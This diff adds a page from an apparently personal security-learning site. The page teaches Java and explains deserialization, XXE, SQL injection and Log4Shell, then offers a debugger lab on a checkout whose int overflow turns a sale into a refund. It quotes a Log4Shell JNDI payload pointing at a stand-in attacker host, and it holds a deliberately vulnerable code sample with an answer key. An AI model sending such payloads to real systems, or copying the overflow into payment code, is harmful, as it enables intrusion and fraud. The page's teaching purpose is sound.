@@ -1,0 +1,70 @@
+<!doctype html>
+<html lang="en" data-root="../" class="wide">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>learn Java :: 0xDay</title>
+<meta name="description" content="Learn Java: simple, mid and complex explanations, with a hands-on lab in a browser sandbox.">
+<meta name="theme-color" content="#07090a">
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'%3E%3Crect width='32' height='32' rx='6' fill='%2307090a'/%3E%3Ctext x='5' y='22' font-family='monospace' font-size='16' fill='%233bff7f'%3E%3E_%3C/text%3E%3C/svg%3E">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../style.css?v=920388eb">
+<link rel="alternate" type="application/rss+xml" title="0xDay" href="https://nrodrigue2004.github.io/0xday/feed.xml">
+<script src="../data.js?v=920388eb" defer></script>
+<script src="../site.js?v=920388eb" defer></script>
+<script src="../fx.js?v=920388eb" defer></script>
+<script src="../sandbox.js?v=920388eb" defer></script>
+<script src="../learn.js?v=920388eb" defer></script>
+<script>(function(){var d=document.documentElement,s={},b='1';try{s=JSON.parse(localStorage.getItem('oxday-set')||'{}');b=localStorage.getItem('oxday-booted')}catch(e){}if(/[?&]embed=1/.test(location.search))d.classList.add('embed');if(s.crt)d.classList.add('crt');if(!b&&s.boot!==false&&!d.classList.contains('embed')&&!d.classList.contains('tty-page')&&!matchMedia('(prefers-reduced-motion: reduce)').matches&&!/bot|crawl|spider|lighthouse/i.test(navigator.userAgent))d.classList.add('booting')})();</script>
+</head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="container">
+<header class="header">
+  <a href="../index.html" class="logo" aria-label="0xDay home"><span class="logo__user">nathan@0xday</span><span class="logo__sep">:</span><span class="logo__path">~</span><span class="logo__sep">$</span><span class="cursor"></span></a>
+  <nav class="menu" aria-label="Main"><ul><li><a href="../posts.html">./blog</a></li><li><a href="../projects.html">./projects</a></li><li><a href="../skills.html">./skills</a></li><li><a href="../certs.html">./certs</a></li><li><a href="../learn.html" aria-current="page">./learn</a></li><li><a href="../lab.html">./lab</a></li><li><a href="../now.html">./now</a></li><li><a href="../about.html">./about</a></li></ul></nav>
+  <button class="menu-trigger" aria-label="Menu" aria-expanded="false">[≡]</button>
+</header>
+<main id="main">
+<p class="cmd">learn --skill java</p>
+<h1>~/learn/java</h1>
+<p class="learn__meta"><span class="muted">languages</span> · my level: <span class="bar__on">■■■</span><span class="bar__off">□□</span> <span class="muted">working</span> · <a href="https://github.com/nrodrigue2004/JavaShooter">proof</a></p>
+<p>Java runs banks, Android apps and enterprise backends. Learn the JVM, types, exceptions and collections, the bugs behind Log4Shell and deserialization attacks, then step through a checkout where integer overflow turns a sale into a refund.</p>
+<nav class="tiers" aria-label="levels"><a href="#tier-1" class="tier" data-tier="simple"><span class="tier__n">1</span>simple</a><a href="#tier-2" class="tier" data-tier="mid"><span class="tier__n">2</span>mid</a><a href="#tier-3" class="tier" data-tier="complex"><span class="tier__n">3</span>complex</a><a href="#tier-4" class="tier" data-tier="lab"><span class="tier__n">4</span>hands-on</a></nav>
+<div class="learn" data-skill="java">
+<div class="learn__doc"><section class="lvl" id="tier-1" data-tier="simple"><h2><span class="lvl__n">01</span> simple <span class="muted">// the idea in plain words</span></h2><p><strong>Java</strong> compiles your code to <strong>bytecode</strong>, which runs on the <strong>JVM</strong> (Java Virtual Machine) on any OS: "write once, run anywhere". It's <strong>statically typed</strong>: every variable has a type, checked before the program runs.</p>
+<p><code>int</code> holds whole numbers, <code>double</code> decimals, <code>boolean</code> true/false, <code>char</code> one character, and <code>String</code> text. Everything lives inside a <strong>class</strong>, and the program starts at <code>public static void main(String[] args)</code>.</p>
+<p>Memory is managed for you: the <strong>garbage collector</strong> frees objects nothing points to anymore, so Java avoids C's buffer overflows and use-after-free bugs.</p>
+<p>The debugger on the right is paused in a checkout program:</p>
+<pre class="ex"><code><span class="ps">$</span> <span class="c">start</span><button class="run" type="button" data-cmd="start" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">step</span><button class="run" type="button" data-cmd="step" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">info locals</span><button class="run" type="button" data-cmd="info locals" title="run in the sandbox">▶ run</button></code></pre><p><button class="btn got" type="button" data-tier="simple">[ ] got it</button></p></section><section class="lvl" id="tier-2" data-tier="mid"><h2><span class="lvl__n">02</span> mid <span class="muted">// how it's actually used</span></h2><h4>Types have limits</h4>
+<p>An <code>int</code> is 32 bits: from <strong>-2,147,483,648</strong> to <strong>2,147,483,647</strong>. Go past the top and it silently <strong>wraps around</strong> to negative. No exception, no warning. <code>long</code> is 64 bits; <code>BigDecimal</code> is exact and is what real money code uses.</p>
+<pre class="ex"><code><span class="ps">$</span> <span class="c">break 5</span><button class="run" type="button" data-cmd="break 5" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">continue</span><button class="run" type="button" data-cmd="continue" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">print t</span><button class="run" type="button" data-cmd="print t" title="run in the sandbox">▶ run</button></code></pre>
+<h4>Exceptions</h4>
+<p>Errors are objects you <code>throw</code> and <code>catch</code>. <strong>Checked</strong> exceptions (<code>IOException</code>) must be handled or declared; <strong>unchecked</strong> ones (<code>NullPointerException</code>, <code>IllegalArgumentException</code>) don't. Never swallow them silently with an empty <code>catch</code>, and never show stack traces to users.</p>
+<h4>Collections and generics</h4>
+<p><code>List&lt;String&gt;</code>, <code>Map&lt;String, Integer&gt;</code>, <code>Set&lt;Long&gt;</code>: the type in angle brackets is checked at compile time.</p><p><button class="btn got" type="button" data-tier="mid">[ ] got it</button></p></section><section class="lvl" id="tier-3" data-tier="complex"><h2><span class="lvl__n">03</span> complex <span class="muted">// what the pros do</span></h2><h4>Java's famous security bugs</h4>
+<ul><li><strong>Insecure deserialization</strong>: <code>ObjectInputStream.readObject()</code> on untrusted data can run code through "gadget chains" in libraries on the classpath. Use JSON with a schema, or an allowlist filter (<code>ObjectInputFilter</code>)</li><li><strong>Log4Shell (CVE-2021-44228)</strong>: Log4j 2 expanded <code>${jndi:ldap://attacker/x}</code> *inside log messages*, so logging a user's input could load and run remote code. The lesson: dependencies are attack surface; know your SBOM and patch fast</li><li><strong>SQL injection</strong>: use <code>PreparedStatement</code> with <code>?</code> placeholders</li><li><strong>XXE</strong>: XML parsers that resolve external entities can read local files. Disable DTDs</li></ul>
+<h4>Integer overflow</h4>
+<p>Use <code>Math.multiplyExact</code> / <code>Math.addExact</code> (throw on overflow), <code>long</code> or <code>BigDecimal</code> for money, and validate input ranges (a quantity of 21,475 GPUs should be rejected long before math).</p>
+<pre class="ex"><code><span class="ps">$</span> <span class="c">continue</span><button class="run" type="button" data-cmd="continue" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">print charge</span><button class="run" type="button" data-cmd="print charge" title="run in the sandbox">▶ run</button>
+<span class="ps">$</span> <span class="c">back</span><button class="run" type="button" data-cmd="back" title="run in the sandbox">▶ run</button></code></pre><p><button class="btn got" type="button" data-tier="complex">[ ] got it</button></p></section><section class="lvl lvl--lab" id="tier-4" data-tier="lab"><h2><span class="lvl__n">04</span> hands-on <span class="muted">// debugger</span></h2><p>A customer "bought" a large order of GPUs and the payment processor <strong>sent them money</strong> instead of charging them. The checkout code checks that quantity is positive.</p>
+<p>Step through the recorded run with the customer's input.</p>
+<p>Submit the **amount in cents that was passed to <code>Payments.charge()</code>**.</p><p class="muted">This one runs in a step-through debugger. <code>start</code>, then <code>step</code> / <code>back</code> through the code and watch the variables change, or set a <code>break</code> and <code>continue</code>. Every <span class="ok">▶ run</span> above is a debugger command. <code>submit &lt;answer&gt;</code> when you have it.</p></section><p><a href="../learn.html">cd ~/learn</a></p></div>
+<aside class="learn__lab"><div id="sandbox" class="term sb"></div><noscript><p>The sandbox needs JavaScript.</p></noscript></aside>
+</div>
+<script type="application/json" id="lab-data">{"id": "java", "title": "Java", "user": "student", "host": "shop", "brief": "A customer \"bought\" a large order of GPUs and the payment processor <strong>sent them money<\/strong> instead of charging them. The checkout code checks that quantity is positive.\n\nStep through the recorded run with the customer's input.\n\nSubmit the **amount in cents that was passed to <code>Payments.charge()<\/code>**.", "hints": ["<code>100000 * 21475<\/code> is 2,147,500,000. What's the biggest number an <code>int<\/code> can hold?", "<code>break 5<\/code>, <code>continue<\/code>, <code>print t<\/code>."], "answers": ["0eb603de40ae53a58c112df1fe497effaf9d3ca31b6c04d691c0596a4acc678b"], "solution": "PGNvZGU+cHJpY2UgKiBxdHk8L2NvZGU+ID0gMTAwLDAwMCDDlyAyMSw0NzUgPSAyLDE0Nyw1MDAsMDAwLCB3aGljaCBpcyBqdXN0IG92ZXIgPGNvZGU+SW50ZWdlci5NQVhfVkFMVUU8L2NvZGU+ICgyLDE0Nyw0ODMsNjQ3KS4gSmF2YSBpbnRzIHdyYXAgc2lsZW50bHksIHNvIHRoZSByZXN1bHQgaXMgMiwxNDcsNTAwLDAwMCDiiJIgMsKzwrIgPSA8c3Ryb25nPi0yMTQ3NDY3Mjk2PC9zdHJvbmc+LiBUaGUgcG9zaXRpdmUtcXVhbnRpdHkgY2hlY2sgb24gbGluZSAxMSBwYXNzZWQsIDxjb2RlPmNoYXJnZTwvY29kZT4gd2VudCBuZWdhdGl2ZSwgYW5kIHRoZSBwYXltZW50IEFQSSB0cmVhdGVkIGEgbmVnYXRpdmUgY2hhcmdlIGFzIGEgcmVmdW5kIG9mICQyMSw0NzQsNjcyLjk2LiBGaXg6IDxjb2RlPk1hdGgubXVsdGlwbHlFeGFjdChwcmljZUNlbnRzLCBxdHkpPC9jb2RlPiAodGhyb3dzIGluc3RlYWQgb2Ygd3JhcHBpbmcpLCB1c2UgPGNvZGU+bG9uZzwvY29kZT4gb3IgPGNvZGU+QmlnRGVjaW1hbDwvY29kZT4gZm9yIG1vbmV5LCBjYXAgcXVhbnRpdHkgdG8gYSBzYW5lIG1heGltdW0sIGFuZCBoYXZlIHRoZSBwYXltZW50IGxheWVyIHJlamVjdCBuZWdhdGl2ZSBjaGFyZ2VzLgo=", "fs": {"/home/student/Checkout.java": "public class Checkout {\n    // prices are stored in cents to avoid floating-point rounding\n    static int total(int priceCents, int qty) {\n        int t = priceCents * qty;\n        return t;\n    }\n\n    public static void main(String[] args) {\n        int price = 100000;                      // $1,000.00 GPU\n        int qty = Integer.parseInt(args[0]);     // from the cart form\n        if (qty <= 0) throw new IllegalArgumentException(\"qty\");\n        int charge = total(price, qty);\n        System.out.println(\"charging \" + charge + \" cents\");\n        Payments.charge(charge);\n    }\n}\n"}, "cmds": [], "cmdnames": [], "style": "debug", "source": "/home/student/Checkout.java", "trace": [{"line": 9, "vars": {"args[0]": "21475"}}, {"line": 10, "vars": {"price": "100000", "args[0]": "21475"}}, {"line": 11, "vars": {"price": "100000", "qty": "21475"}}, {"line": 12, "vars": {"price": "100000", "qty": "21475"}}, {"line": 4, "vars": {"priceCents": "100000", "qty": "21475"}}, {"line": 5, "vars": {"priceCents": "100000", "qty": "21475", "t": "-2147467296"}}, {"line": 13, "vars": {"price": "100000", "qty": "21475", "charge": "-2147467296"}, "out": "charging -2147467296 cents"}, {"line": 14, "vars": {"price": "100000", "qty": "21475", "charge": "-2147467296"}, "out": "[payments] amount < 0: processed as REFUND of $21,474,672.96"}, {"line": 15, "vars": {"price": "100000", "qty": "21475", "charge": "-2147467296"}}]}</script>
+</main>
+<footer class="footer">
+  <span><span class="ok">[ exit 0 ]</span> &copy; <span class="year">2026</span> Nathan</span>
+  <span class="footer__links"><a href="../tags.html">tags</a> <a href="../resources.html">resources</a> <a href="../changelog.html">changelog</a> <a href="../feed.xml">rss</a> <a href="https://github.com/nrodrigue2004">github</a> <a href="https://www.linkedin.com/in/nathan-rodrigue-669795249/">linkedin</a> <button class="link ghost-open" type="button">ghost --help</button></span>
+</footer>
+</div>
+</body>
+</html>
